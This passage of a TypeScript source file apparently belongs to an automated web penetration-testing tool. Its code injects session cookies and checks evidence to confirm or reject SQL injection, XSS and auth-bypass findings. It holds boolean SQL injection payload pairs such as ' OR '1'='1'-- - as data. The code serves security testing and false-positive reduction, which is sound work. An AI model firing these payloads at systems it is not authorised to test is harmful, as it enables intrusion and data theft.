    .map((s) => s.trim())
    .filter(Boolean)
    .map((kv) => {
      const i = kv.indexOf("=");
      return { name: kv.slice(0, i).trim(), value: kv.slice(i + 1).trim(), domain: host, path: "/" };
    })
    .filter((c) => c.name);
  return { header, browserCookies, origins: [], bearer: "" };
}

type AuthDriver = {
  addCookies: (cookies: LoadedAuth["browserCookies"]) => Promise<void>;
  restoreLocalStorage?: (origins: StorageOrigin[]) => Promise<void>;
  gotoUrl?: (url: string) => Promise<void>;
  bearerToken?: () => Promise<string | null>;
};

/** Inject a loaded cookie/storageState file into the live driver + return cookie/Bearer for the HTTP path. */
export async function applyLoadedAuth(driver: AuthDriver, loaded: LoadedAuth, targetUrl: string): Promise<{ cookie: string; bearer: string }> {
  if (loaded.browserCookies.length) await driver.addCookies(loaded.browserCookies);
  if (loaded.origins.length && driver.restoreLocalStorage) await driver.restoreLocalStorage(loaded.origins);
  if (driver.gotoUrl) await driver.gotoUrl(targetUrl).catch(() => undefined);
  const live = driver.bearerToken ? ((await driver.bearerToken().catch(() => null)) ?? "") : "";
  return { cookie: loaded.header, bearer: loaded.bearer || live };
}

// ── hybrid judgment for auth-bypass: the machine vetoes "auth is clearly enforced", only gray cases go to Claude ──
const LOGIN_MARKERS = /sign[\s-]?in|log[\s-]?in|\bpassword\b|forbidden|unauthorized|access denied|ログイン|サインイン|認証が必要|権限/i;
function looksLikeLogin(body: string): boolean {
  return LOGIN_MARKERS.test(body.slice(0, 4000));
}

/** For attended keepalive: judge whether a role's context was bounced back to login (= session expired).
 *  If the URL path is login/signin/auth/sso-ish, or the visible text is login wording → treated as dead (needs re-login). */
export function sessionLooksDead(snap: { url: string; visibleText: string }): boolean {
  let path = snap.url.toLowerCase();
  try {
    path = new URL(snap.url).pathname.toLowerCase();
  } catch {
    /* relative/malformed URL: judge as-is, lowercased */
  }
  if (/(^|\/)(login|signin|sign-in|auth|sso|account\/login)(\/|$|\?)/.test(path)) return true;
  return looksLikeLogin(snap.visibleText);
}

/** From a keepalive touch (a raw-HTTP GET of an authed URL), does the session look expired? 401/403, a redirect to a
 *  login-ish location, or a login/denied body all mean the session died and re-auth is needed. */
export function touchIsDead(status: number, location: string | undefined, body: string): boolean {
  if (status === 401 || status === 403) return true;
  if (status >= 300 && status < 400 && location && /(login|signin|sign-in|auth|sso)/i.test(location)) return true;
  return looksLikeLogin(body);
}

/** Merge a response's Set-Cookie into an existing `Cookie:` header (best-effort). Keeps cookies the response didn't
 *  touch, overwrites the names it rotated. Used by keepalive's raw-HTTP touch to pick up a rotated session cookie
 *  WITHOUT a page load (so a fragile site's session survives). undici joins multiple Set-Cookie with ", ", so split
 *  only where a comma is followed by a fresh `token=` (not inside `Expires=Wed, 09-Jun-...`, which has no `=` there). */
export function mergeSetCookie(current: string, setCookie: string | undefined): string {
  if (!setCookie) return current;
  const jar = new Map<string, string>();
  for (const kv of current.split(";")) {
    const s = kv.trim();
    const i = s.indexOf("=");
    if (i > 0) jar.set(s.slice(0, i).trim(), s.slice(i + 1));
  }
  for (const chunk of setCookie.split(/,(?=\s*[A-Za-z0-9!#$%&'*+.^_`|~-]+=)/)) {
    const first = (chunk.split(";")[0] ?? "").trim();
    const i = first.indexOf("=");
    if (i <= 0) continue;
    const name = first.slice(0, i).trim();
    const value = first.slice(i + 1).trim();
    if (value) jar.set(name, value); // ignore empty-value deletions rather than risk dropping a live cookie
  }
  return [...jar].map(([k, v]) => `${k}=${v}`).join("; ");
}

/** Detect an error / login catch-all page — an ASP.NET `aspxerrorpath` redirect, a generic ErrX/error/40x/50x static
 *  page, or a bounce (requested != final) that lands on a login/denied body. Such a page is NOT real functionality: it
 *  must not be enrolled as a screen and its links must not seed the frontier (they derail the crawl onto the error page,
 *  the a-mre85zq4 symptom). The requested route is flagged referer-gated instead — reach it via an in-app click, not a
 *  cold navigation. */
export function looksLikeErrorCatchAll(o: Pick<Observation, "requestedUrl" | "finalUrl" | "visibleText">): boolean {
  const final = o.finalUrl;
  if (/[?&]aspxerrorpath=/i.test(final)) return true; // ASP.NET unhandled-route / request-validation catch-all
  let path = final.toLowerCase();
  try {
    path = new URL(final).pathname.toLowerCase();
  } catch {
    /* relative/malformed: match against the raw string */
  }
  if (/\/(err[a-z0-9_-]*|error|errorpage|400|401|403|404|500|accessdenied|denied|forbidden)\.[a-z0-9]+$/.test(path)) return true;
  // a redirect/bounce that ends on a login/denied page (the route needs in-app referer/click context to reach real content)
  if (stripHash(o.requestedUrl) !== stripHash(o.finalUrl) && looksLikeLogin(o.visibleText)) return true;
  return false;
}

/** Detect a WAF / bot-management block or challenge (Cloudflare "Just a moment..." with cf-mitigated, Akamai / Incapsula /
 *  Imperva, a 429 / 503, or a 403 challenge interstitial). Such a response is NOT the application — a length/differential
 *  signal measured on it is block-page variance (a rotating cf-ray / nonce), not a real effect. Used to refuse confirming
 *  a finding when the probes are actually being blocked (the namejet.com run manufactured 5 "confirmed SQLi" from 403
 *  "Just a moment" challenge pages because the boolean length delta was just challenge-page variance). */
export function looksBlocked(res: { status: number; headers?: Record<string, string>; body?: string }): boolean {
  const h = res.headers ?? {};
  if (h["cf-mitigated"]) return true; // Cloudflare bot-management (challenge/block) — definitive
  if (res.status === 429 || res.status === 503) return true;
  const b = (res.body ?? "").slice(0, 2000);
  if (/just a moment\.\.\.|challenges\.cloudflare\.com|cf-mitigated|attention required/i.test(b)) return true;
  // Bare CDN/WAF vendor names (Akamai/Incapsula/Imperva) appear in NORMAL 200 app pages — those vendors inject asset
  // refs (assets.akamaized.net, /_Incapsula_Resource) into every page's <head>. Treat them as a block ONLY on a non-2xx
  // status (a real 403/5xx challenge), else every confirmed finding on a CDN-fronted site (much of enterprise/VDP scope)
  // is wrongly demoted as a "block page".
  if ((res.status < 200 || res.status >= 300) && /_incapsula_|imperva|akamai/i.test(b)) return true;
  if (res.status === 403 && /captcha|challenge|verify you are (?:a )?human|are you a robot|enable javascript/i.test(b)) return true;
  return false;
}

/** Strip per-request VOLATILE tokens from a response body before a length/differential comparison, so two responses with
 *  the SAME content but different tokens (CSP nonce, ASP.NET __VIEWSTATE / __EVENTVALIDATION, a CSRF/XSRF token, a
 *  timestamp / datetime, a "generated in Nms" note) compare as equal length. Kills the FP+FN both created by token churn.
 *  Scoped to the length-differential path (SQLi boolean etc.) — NOT the IDOR impact-oracle, which needs the raw ids. */
export function normalizeVolatile(body: string): string {
  return body
    .replace(/(name="__(?:VIEWSTATE|VIEWSTATEGENERATOR|EVENTVALIDATION)"[^>]*?value=")[^"]*/gi, "$1") // ASP.NET hidden state
    .replace(/(\bnonce=")[^"]*/gi, "$1") // CSP / script nonce
    .replace(/((?:csrf|xsrf|_token|authenticity_token|requestverificationtoken)["'\s:=>]{1,4})[A-Za-z0-9+/=_-]{8,}/gi, "$1")
    .replace(/\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?/g, "DT") // datetimes
    .replace(/\b\d{10,13}\b/g, "TS") // unix timestamps (s / ms)
    .replace(/\b(?:in|took)\s+\d+(?:\.\d+)?\s*(?:ms|s|seconds?|milliseconds?)\b/gi, "DUR"); // "generated in 12ms"
}

/** Is `marker` reflected in a LIVE HTML position — at least one occurrence NOT inside a <script>...</script> block? A
 *  payload echoed into a framework's flight-data / JSON script (Next.js self.__next_f / __NEXT_DATA__, where `<` is
 *  serialized/escaped to a \\u003c unicode escape) is INERT: it is data, not markup, and cannot execute. Reflected-XSS
 *  confirmation must ignore those
 *  occurrences — they FP'd infiniteathlete.ai's Next.js pages (marker matched inside the RSC flight data). */
export function reflectionIsLive(body: string, marker: string): boolean {
  if (!marker) return false;
  // Containers whose content is NOT parsed as active HTML markup — a tag reflected inside them is INERT and cannot
  // execute: <script> is JS; <title>/<textarea> are RCDATA (tags don't instantiate); <style> is raw text; <!-- --> is a
  // comment. Only excluding <script> (the old behaviour) false-confirmed reflections into a page <title> or a JSON blob.
  // Match container tags on TAG BOUNDARIES (open name followed by whitespace / > / /), not raw substrings — otherwise
  // "<title" matched a custom element "<title-bar>" (whose "</title-bar>" does NOT contain "</title>"), so a LIVE
  // reflection after such a tag was wrongly judged inert. Comment close accepts the non-standard --!> too.
  const inertPairs: Array<[RegExp, RegExp]> = [
    [/<script(?=[\s/>])/g, /<\/script\s*>/g],
    [/<title(?=[\s/>])/g, /<\/title\s*>/g],
    [/<textarea(?=[\s/>])/g, /<\/textarea\s*>/g],
    [/<style(?=[\s/>])/g, /<\/style\s*>/g],
    [/<!--/g, /--!?>/g],
  ];
  const lastMatch = (re: RegExp, s: string): number => {
    let idx = -1;
    for (const m of s.matchAll(re)) idx = m.index ?? idx;
    return idx;
  };
  let from = 0;
  for (;;) {
    const i = body.indexOf(marker, from);
    if (i < 0) return false;
    const pre = body.slice(0, i).toLowerCase(); // HTML tags are case-insensitive; the marker match above stays case-sensitive
    const inert = inertPairs.some(([open, close]) => lastMatch(open, pre) > lastMatch(close, pre));
    if (!inert) return true; // this occurrence is in a LIVE HTML position (not inside any inert container)
    from = i + marker.length; // inert → skip, try the next occurrence
  }
}

/** The minimum body-length delta that counts as a REAL difference, given the page's own measured jitter (noise). A fixed
 *  ±64 is fooled by dynamic content (ads / rotating tokens / __VIEWSTATE) — require the delta to clear max(floor, noise*k)
 *  so a "signal" below the page's natural variance is NOT confirmed (it degrades to a lead instead of a false positive). */
export function diffThreshold(noise: number, floor = 64, k = 2): number {
  return Math.max(floor, Math.round(Math.abs(noise) * k));
}

/** Matched TRUE/FALSE pairs — same length, same quoting. Mixing `' OR '1'='2'` with unquoted ` OR 1=1` is how
 *  Drupal/marketing search HTML became "boolean SQLi": two different search strings, not a SQL tautology. */
export const SQLI_BOOLEAN_PAIRS: ReadonlyArray<{ t: string; f: string }> = [
  { t: "' OR '1'='1'-- -", f: "' OR '1'='2'-- -" },
  { t: "' AND '1'='1'-- -", f: "' AND '1'='2'-- -" },
  { t: " OR 1=1-- -", f: " OR 1=2-- -" },
  { t: "') OR ('1'='1", f: "') OR ('1'='2" },
];

const SQL_ERR_RE =
  /sql syntax|you have an error in your sql|warning:\s*mysql|ORA-\d{3,}|PostgreSQL.*ERROR|SQLite3?::|ODBC[^;]*SQL|unclosed quotation|quoted string not properly terminated|SQLSTATE\[/i;

/** Full HTML document (Drupal/marketing search). JSON APIs and TIME-BASED proof strings are not this. */
export function looksLikeHtmlDocument(body: string): boolean {
  const head = body.slice(0, 512).toLowerCase();
  return head.includes("<!doctype html") || /<html[\s>]/.test(head);
}

/** JSON or XML — the only body kinds where a boolean length delta is a SQL oracle, not a search-result page. */
export function looksLikeStructuredBody(body: string): boolean {
  const t = body.trimStart();
  if (t.startsWith("{") || t.startsWith("[")) return true;
  return t.slice(0, 5).toLowerCase() === "<?xml";
}

/** Drop the payload (raw + encoded + HTML-escaped) so a search box echoing the query cannot create a length oracle. */
export function stripPayloadEcho(body: string, payload: string): string {
  if (!payload) return body;
  const esc = payload.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
  const variants = [payload, encodeURIComponent(payload), esc, payload.replace(/'/g, "&#x27;"), payload.replace(/'/g, "&apos;")];
  let s = body;
  for (const v of variants) {
    if (v.length > 0) s = s.split(v).join("");
  }
  return s;
}

/** Boolean length may confirm SQLi only on JSON/XML, and only with equal-length matched pairs. */
export function booleanLengthConfirmsSqli(trueBody: string, falseBody: string, truePayload: string, falsePayload: string, noiseThr: number): boolean {
  if (truePayload.length !== falsePayload.length) return false;
  if (!looksLikeStructuredBody(trueBody) || !looksLikeStructuredBody(falseBody)) return false;
  const t = normalizeVolatile(stripPayloadEcho(trueBody, truePayload));
  const f = normalizeVolatile(stripPayloadEcho(falseBody, falsePayload));
  // A structured TRUE-vs-FALSE differential is SQLi whether it shows as a length delta OR a same-length CONTENT flip
  // ({"ok":1} vs {"ok":0}, both 8 bytes). Length-only missed the content flip entirely. Payloads (equal length) and
  // volatile tokens are already stripped, so a residual content difference is the boolean oracle firing.
  if (Math.abs(t.length - f.length) > noiseThr) return true;
  return t !== f && t.length > 0;
}

/** True → refuse confirmed SQLi: cited bodies are HTML/text length, not JSON/XML, a SQL error, a time-based proof, or a
 *  status flip. Optional statuses let a 401/403→200 auth-bypass (even with HTML bodies) escape the HTML-length veto. */
export function sqliHtmlLengthOnlyFp(_controlBody: string, positiveBodies: ReadonlyArray<string>, controlStatus?: number, positiveStatuses?: ReadonlyArray<number>): boolean {
  if (positiveBodies.some((b) => SQL_ERR_RE.test(b))) return false;
  if (positiveBodies.some((b) => /TIME-BASED BLIND SQLi CONFIRMED/i.test(b))) return false;
  // A STATUS FLIP (e.g. a 401/403 control → 200 positives) is a real SQL auth-bypass signal, not HTML-length variance —
  // even when the positive bodies are HTML (an authenticated dashboard). Judge the EFFECT, not the body kind.
  if (controlStatus !== undefined && positiveStatuses && positiveStatuses.length > 0 && positiveStatuses.every((s) => s >= 200 && s < 300 && s !== controlStatus)) return false;
  // The injection EFFECT lives in the POSITIVE bodies (the exfiltrated rows / the auth token in JSON). Judge those, NOT
  // the control: an auth-bypass control is frequently a PLAIN-TEXT 401 ("Invalid email or password"), and requiring the
  // control to be structured too wrongly demoted a real JSON auth-bypass (Juice Shop ' OR 1=1-- : text 401 vs a 200
  // {authentication:{token}} positive). If the positives are structured JSON/XML, this is not the HTML-length FP.
  if (positiveBodies.length > 0 && positiveBodies.every(looksLikeStructuredBody)) return false;
  return true;
}

export type AccessVerdict = "not_bypass" | "needs_judgment" | "inconclusive";

/** Does the UNAUTH response actually reproduce the authenticated PROTECTED content (a real bypass), rather than being a
 *  generic/public 200 that merely isn't the login page? Normalizes volatile tokens, then requires the unauth body to
 *  equal — or reproduce a substantial contiguous chunk of — the authed body. Without this mechanical check, ANY unauth
 *  200 non-login page (marketing, a different view, an error) reached needs_judgment and could be recorded as auth-bypass
 *  on the model's say-so alone. */
export function protectedContentLeaked(unauthBody: string, authBody: string): boolean {
  const u = normalizeVolatile(unauthBody).replace(/\s+/g, " ").trim();
  const a = normalizeVolatile(authBody).replace(/\s+/g, " ").trim();
  if (u.length < 32 || a.length < 32) return false;
  if (u === a) return true; // identical protected content served without auth
  // Sample contiguous windows from the SMALLER body and search the larger: a genuine leak is often a SUBSET (the unauth
  // response shows a few of the protected records) — sampling only the larger authed body lands the windows inside
  // authed-only records the unauth body never had, missing a real partial exposure.
  const [small, big] = u.length <= a.length ? [u, a] : [a, u];
  for (const frac of [0.2, 0.4, 0.6, 0.8]) {
    const start = Math.floor(small.length * frac);
    const chunk = small.slice(start, start + 60);
    if (chunk.length >= 40 && big.includes(chunk)) return true; // one body reproduces a substantial chunk of the other's content
  }
  return false;
}

/** Unauthenticated/authenticated responses → machine verdict for auth-bypass.
 *  302→login / 401 / 403 / non-200 / login body are all **not_bypass (auth is enforced, can't be overturned)**.
 *  A **needs_judgment** now additionally requires the unauth body to REPRODUCE the authed protected content (mechanical
 *  body-match) — so a generic/public 200 can't be recorded as auth-bypass on judgment alone. */
export function classifyAccess(
  unauth: { status: number; location?: string; body: string },
  auth: { status: number; body: string } | null,
): { verdict: AccessVerdict; reason: string } {
  if (unauth.status >= 300 && unauth.status < 400)
    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} redirect${unauth.location ? ` (${unauth.location})` : ""} = auth enforced` };
  if (unauth.status === 401 || unauth.status === 403)
    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} = auth enforced` };
  if (unauth.status !== 200)
    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} (no protected content)` };
  if (looksLikeLogin(unauth.body)) return { verdict: "not_bypass", reason: "unauth body is a login/denied page, not protected content" };
  // reaching here means unauth 200 & non-login = gray
  if (!auth) return { verdict: "inconclusive", reason: "no authenticated session to compare — login(role) first" };
  if (auth.status >= 300 || looksLikeLogin(auth.body))
    return { verdict: "inconclusive", reason: "authenticated baseline is itself login/redirect — cannot establish protected content" };
  // Mechanical body-match: a real bypass means the UNAUTH response reproduces the authed protected content. A generic/
  // public 200 that merely differs from the login page is NOT a bypass — hard veto so it can't be recorded.
  if (!protectedContentLeaked(unauth.body, auth.body))
    return { verdict: "not_bypass", reason: "unauth 200 body does NOT reproduce the authenticated protected content — a generic/public page, not a bypass" };
  return { verdict: "needs_judgment", reason: "unauth 200 reproduces the authenticated protected content — confirm it IS sensitive/private data" };
}

/** Return the in-scope URLs from observed links that should go on the frontier (pure).
 *  Under a hard lock (fixed URL list), returns empty = don't follow discovered links (no cross-site crawl).
 *  Excludes out-of-scope / logout-ish / ignore_paths / already-visited. */
export function frontierLinks(
  o: Pick<Observation, "finalUrl" | "links"> & { virtualRoutes?: string[] },
  s: Pick<PilotSession, "scope" | "lockToSeeds" | "visited" | "ignorePaths" | "targetUrl" | "refererGated">,
): string[] {
  if (s.lockToSeeds) return [];
  const out = new Set<string>();
  // In addition to normal links, also add SPA virtual routes the driver captured via pushState/hashchange to the frontier
  // (hash-routed SPAs tend to collapse hrefs, so we backfill from the routes actually walked).
  for (const link of [...o.links, ...(o.virtualRoutes ?? [])]) {
    let abs: string;
    try {
      abs = stripHash(new URL(link, o.finalUrl).toString());
    } catch {
      continue;
    }
    if (!isInScope(abs, s.scope)) continue;
    if (isSessionDestroyingPath(abs)) continue; // don't add logout/signout links to the frontier (self-sabotage if walked)
    if (pathIsIgnored(abs, s.ignorePaths, s.targetUrl)) continue; // don't add low-value paths the model pruned
    if (s.refererGated.has(abs)) continue; // known to bounce to the error page on cold nav — don't re-queue it for goto
    if (!s.visited.has(abs)) out.add(abs);
  }
  return [...out];
}

/** Tally diagnosis-probe response statuses (for the auth-wall circuit breaker). 401 = wall, 2xx = got through.
 *  `active` (default true) = a real vuln probe that counts toward the screen_done coverage gate. PASSIVE/hygiene probes
 *  (probe_headers) pass active:false so a screen can't be closed "tested-clean" on header checks alone (mapped, never
 *  attacked). httpProbes/httpThrough still tally every request — the auth-wall breaker wants the full sample. */
function bumpHttp(s: PilotSession, status: number, opts: { active?: boolean } = {}): void {
  s.httpProbes += 1;
  if (opts.active !== false) s.screenProbes += 1; // active per-screen diagnosis activity (cross-checks the screen_done gate)
  if (status === 401) s.httpAuthWall += 1;
  else if (status >= 200 && status < 300) s.httpThrough += 1;
}

/** A response that is actually an upstream PROXY/connection error page (Burp "SOCKS: Host unreachable", a 502 tunnel
 *  failure, ERR_PROXY_CONNECTION_FAILED) rather than the target itself. When routing through --burp-proxy and the host
 *  is unreachable, Burp returns such a page (often as HTTP 200); auditing it produces false "missing header" findings on
 *  a host that was never actually reached, so probe_headers / record_finding must refuse it. */
export function looksLikeProxyError(body: string): boolean {
  return /SOCKS:\s|Host unreachable|<title>\s*Burp Suite\s*<\/title>|ERR_(?:PROXY|TUNNEL|CONNECTION)|tunnel connection failed|proxy(?:\s|-)error/i.test(body.slice(0, 2000));
}

/** Pull the planned attack classes out of a screen plan's `classes=[a,b,c]` prefix, canonicalized (for the coverage gate).
 *  "One-shot" classes like info-disclosure/headers/misconfig/session are exempt from coverage enforcement (they can surface even if not in the plan). */
export function plannedClassesFor(plan: string | undefined): string[] {
  if (!plan) return [];
  const m = /^classes=\[([^\]]*)\]/.exec(plan);
  if (!m) return [];
  const raw = (m[1] ?? "").split(",").map((c) => c.trim()).filter(Boolean);
  // Classes found passively/opportunistically (not forced into active coverage even if written into the plan).
  const EXCLUDED = new Set(["other", "headers", "info-disclosure", "misconfig", "session"]);
  const out = new Set<string>();
  for (const c of raw) {
    const cc = coarseClass(c);
    if (cc && !EXCLUDED.has(cc)) out.add(cc);
  }
  return [...out];
}

/** screen_done coverage gate (pure). Requires that coverage accounts for every planned attack class, and that
 *  "if you claim tested-clean/found, you probed at least once". Returns a reject reason if not satisfied.
 *  Screens with no classes in the plan (no plan / info-only) are exempt from the gate (can close as before). */
export function checkScreenCoverage(
  planned: string[],
  coverage: ReadonlyArray<{ class: string; result: string }>,
  screenProbes: number,
): { ok: true } | { ok: false; reason: string } {
  if (planned.length === 0) return { ok: true };
  const covered = new Set(coverage.map((c) => coarseClass(c.class)));
  const missing = planned.filter((p) => !covered.has(p));
  if (missing.length > 0) {
    return {
      ok: false,
      reason: `the plan named ${planned.length} attack class(es); you haven't accounted for: ${missing.join(", ")}. Test each (record_finding) or pass a coverage entry marking it tested-clean / not-applicable(reason). Do NOT stop at the first finding.`,
    };
  }
  const claimsTested = coverage.some((c) => c.result === "tested-clean" || c.result === "found" || c.result === "suspected");
  if (claimsTested && screenProbes === 0) {
    return {
      ok: false,
      reason: `coverage claims classes were tested, but no probe (http_request / probe_params / probe_logic / verify_access) was fired on this screen. Actually exercise the plan before closing.`,
    };
  }
  return { ok: true };
}

/** survey_done auth gate (pure): reject if roles are configured but no authenticated session is up.
 *  Closing survey while anonymous leaves the entire post-login surface unmapped, silently halving the screen count.
 *  authActive = currentCookie or Bearer is non-empty (currentRole being set is not enough — attended would false-positive). */
export function surveyAuthGate(roleCount: number, authActive: boolean): { ok: true } | { ok: false } {
  return roleCount > 0 && !authActive ? { ok: false } : { ok: true };
}

/** Structural evidence-discipline check (pure, category-independent). Enforces the same discipline as runValidator on pilot findings:
 *  (1) ≥2 positive replays that are mutually stable (matching status, body length within ±64) = reproducibility,
 *  (2) a negative control distinguishable from the positives (different status or body-length delta >64) = a real diff, not a catch-all.
 *  record_finding calls that fail this are rejected (seals the main FP mode of hallucinated/weak findings). */
export function checkEvidenceDiscipline(
  neg: { status: number; bodyLen: number },
  positives: ReadonlyArray<{ status: number; bodyLen: number }>,
): { ok: true } | { ok: false; reason: string } {
  if (positives.length < 2) return { ok: false, reason: "need >=2 positive replays" };
  const p0 = positives[0]!;
  const stable = positives.every((p) => p.status === p0.status && Math.abs(p.bodyLen - p0.bodyLen) <= 64);
  if (!stable) return { ok: false, reason: "the positive replays disagree (status or body length differ) — unstable / not reproducible" };
  const differs = neg.status !== p0.status || Math.abs(neg.bodyLen - p0.bodyLen) > 64;
  if (!differs) return { ok: false, reason: "the negative control is indistinguishable from the positives (same status & body length) — catch-all / no real effect" };
  // A body-length-ONLY differential (positives + control share a status) is only meaningful on a real 2xx APP response.
  // On a non-2xx status (a 403/429/503 WAF challenge, a 5xx error) the length varies for reasons unrelated to the payload
  // (a rotating Cloudflare nonce/cf-ray) — that manufactured "confirmed SQLi" from 403 "Just a moment" challenge pages.
  if (neg.status === p0.status && !(p0.status >= 200 && p0.status < 300))
    return { ok: false, reason: `both control and positives are status ${p0.status} — not a 2xx app response (WAF challenge / error / block page); a body-length differential there is block-page variance, not a real effect` };
  return { ok: true };
}

/** Business-logic evidence discipline (pure, marker-based). Judged by "a sign the manipulation took effect (effectMarker)", not length delta:
 *  ok if the marker appears in the manipulated request (positive), is absent in the legitimate request (control), and positives are ≥2, stable & accepted (<400).
 *  Captures semantic diffs like price=1 going through / role=admin being reflected, even when status/length are nearly identical. */
export function checkLogicEvidence(
  control: { status: number; hasMarker: boolean },
  positives: ReadonlyArray<{ status: number; hasMarker: boolean }>,
  opts: { requireSuccess?: boolean } = {},
): { ok: true } | { ok: false; reason: string } {
  // requireSuccess (default true) enforces status<400 = "the manipulation was ACCEPTED" (business-logic / redirect). For
  // REFLECTED XSS it must be false: a payload reflected into a custom 403/404 error page still executes in the browser,
  // so the marker — not the status — is what confirms it. Gating XSS on status<400 wrongly refutes error-page XSS.
  const requireSuccess = opts.requireSuccess ?? true;
  if (positives.length < 2) return { ok: false, reason: "need >=2 positive replays of the manipulated request" };
  if (control.hasMarker) return { ok: false, reason: "the effectMarker is ALSO present in the legitimate baseline — pick a marker that only appears when the manipulation takes effect" };
  if (!positives.every((p) => p.hasMarker)) return { ok: false, reason: "the effectMarker is absent in a manipulated replay — the manipulation was not accepted (not confirmed)" };
  if (requireSuccess && !positives.every((p) => p.status < 400)) return { ok: false, reason: "a manipulated replay was rejected (status >=400) — not accepted" };
  if (!positives.every((p) => p.status === positives[0]!.status)) return { ok: false, reason: "manipulated replays disagree (unstable)" };
  return { ok: true };
}

/** Auth-wall circuit-breaker check (pure): true when there's a sufficient sample, nothing got through (zero 2xx), zero findings,
 *  and nearly all responses are 401. When this trips, the diagnosis loop stops the remaining screens and raises a handoff. */
export function isAuthWalled(
  s: { findings: { length: number }; httpProbes: number; httpThrough: number; httpAuthWall: number },
  minSample = 12,
): boolean {
  return s.findings.length === 0 && s.httpProbes >= minSample && s.httpThrough === 0 && s.httpAuthWall / s.httpProbes >= 0.85;
}

/** Persist one observation to screens (auto-enrolls it as queued in the coverage ledger) and update the frontier. */
function recordObservation(s: PilotSession, o: Observation): { screen: Screen; isNew: boolean } {
  const authState = s.currentRole ? "post-login" : "unauth";
  const { screen, isNew } = s.inv.ingest(o, authState);
  s.store.upsertScreen(s.assessmentId, screen);
  const here = stripHash(o.finalUrl);
  s.visited.add(here);
  s.frontier.delete(here);
  // Exploration cap (--max-survey-screens): on reaching it, empty the frontier and add no further discovered links
  //   (map no more → survey_status's frontier goes empty and the model calls survey_done).
  if (s.maxSurveyScreens != null && s.inv.screens().length >= s.maxSurveyScreens) {
    if (!s.surveyCapped) {
      s.surveyCapped = true;
      s.frontier.clear();
      s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `🧭 survey cap reached (${s.maxSurveyScreens} screens) — stopping exploration; remaining links not followed` } });
    }
  } else {
    // The screen + its APIs are already recorded (the ingest above). Under a hard lock, add no discovered links (frontierLinks returns []).
    for (const abs of frontierLinks(o, s)) s.frontier.add(abs);
  }
  return { screen, isNew };
}

/** Save the screen's screenshot to artifacts/screens/<id>.png and update screen.screenshot (for WebUI display). */
async function captureScreenshot(s: PilotSession, screen: Screen): Promise<void> {
  if (screen.screenshot) return; // already captured
  const rel = `screens/${screen.screenId}.png`;
  const okShot = await s.driver.saveScreenshot(join(s.artifactsDir, rel));
  if (okShot) {
    screen.screenshot = rel;
    s.store.upsertScreen(s.assessmentId, screen);
  }
}

/** CSS selectors to find the anchor-page link that points at a referer-gated route (exact path, absolute URL, or a
 *  suffix match for relative hrefs). Pure, so it's unit-tested. */
export function anchorLinkSelectors(targetUrl: string): string[] {
  let path = targetUrl;
  try {
    path = new URL(targetUrl).pathname;
  } catch {
    /* relative/malformed: match against the raw string */
  }
  const esc = (v: string): string => v.replace(/"/g, '\\"');
  return [`a[href="${esc(path)}"]`, `a[href="${esc(targetUrl)}"]`, `a[href$="${esc(path)}"]`];
}

/** Reach a referer-gated route by clicking its link from the goto-safe anchor hub (the menu), when --anchor-url is set.
 *  Positions the browser at the anchor (a cold GET the anchor survives), clicks the route's link (in-app nav, session
 *  preserved), and enrolls the reached view. Returns null if the link isn't on the anchor or the click still bounces —
 *  the caller then falls back to flagging the route referer-gated (unchanged no-anchor behavior). */
async function reachViaAnchor(s: PilotSession, targetUrl: string): Promise<{ screen: Screen; isNew: boolean } | null> {
  if (!s.anchorUrl) return null;
  try {
    await s.driver.visit(s.anchorUrl); // goto-safe hub — position the browser there
    const clicked = await s.driver.clickFirst(anchorLinkSelectors(targetUrl));
    if (!clicked) return null;
    const fired = s.driver.drainApiCalls();
    const snap = await s.driver.snapshot();
    const o: Observation = {
      requestedUrl: targetUrl,
      finalUrl: snap.url,
      status: 200,
      title: snap.title,
      domSkeleton: snap.domSkeleton,
      visibleText: snap.visibleText,
      forms: snap.forms,
      links: snap.links,
      virtualRoutes: snap.virtualRoutes,
      apiCalls: fired,
      scripts: [],
    };
    if (looksLikeErrorCatchAll(o)) return null; // the click still bounced to the error page
    const rec = recordObservation(s, o);
    await captureScreenshot(s, rec.screen);
    s.refererGated.delete(stripHash(targetUrl));
    s.refererGated.delete(stripHash(snap.url));
    return rec;
  } catch {
    return null;
  }
}

/** Input sweep — the primary surface-discovery engine: exercise this screen's forms / search boxes with benign values and
 *  add newly discovered in-scope routes/APIs to the frontier. Run on every NEW screen whether it was reached by
 *  browser_navigate OR browser_click, so a click-driven survey on a session-fragile site does not lose it (the old code
 *  only swept inside browser_navigate → click-reached screens got zero discovery). No-op unless enabled + new + not locked. */
async function runInputSweep(s: PilotSession, screen: Screen, isNew: boolean): Promise<{ exercised: number; added: number }> {
  if (!s.inputSweep || s.lockToSeeds || !isNew) return { exercised: 0, added: 0 };
  try {
    const sweep = await s.driver.exerciseInputs({
      aggressive: s.aggressiveForms,
      allow: (u) => isInScope(u, s.scope) && !isSessionDestroyingPath(u),
    });
    let added = 0;
    for (const d of sweep.discovered) {
      const abs = stripHash(d);
      if (!isInScope(abs, s.scope) || isSessionDestroyingPath(abs)) continue;
      if (s.visited.has(abs) || s.frontier.has(abs) || s.refererGated.has(abs)) continue;
      if (pathIsIgnored(abs, s.ignorePaths, s.targetUrl)) continue;
      s.frontier.add(abs);
      added += 1;
    }
    if (sweep.exercised > 0)
      s.store.appendEvent(s.assessmentId, {
        type: "note",
        payload: { message: `⌨ input sweep ${screen.screenId}: exercised ${sweep.exercised} form/input(s) → +${added} new route/API to frontier` },
      });
    return { exercised: sweep.exercised, added };
  } catch (e) {
    s.store.appendEvent(s.assessmentId, { type: "note", payload: { message: `⚠ input sweep ${screen.screenId} failed: ${String(e).slice(0, 100)}` } });
    return { exercised: 0, added: 0 };
  }
}

/** A normalized dynamic path placeholder ({id}, {id2}, {orderId}) — can't be navigated literally, so it's not a probe candidate. */
function isDynamicSeg(seg: string): boolean {
  return /^\{.*\}$/.test(seg);
}

/** Path segments of a urlTemplate (templates are paths, but tolerate an absolute URL defensively). Root ("/") → []. */
function templateSegs(urlTemplate: string): string[] {
  let path = urlTemplate;
  try {
    path = new URL(urlTemplate).pathname; // absolute → pathname; a bare path throws and stays as-is
  } catch {
    /* already a path */
  }
  return path.split("/").filter((x) => x.length > 0);
}

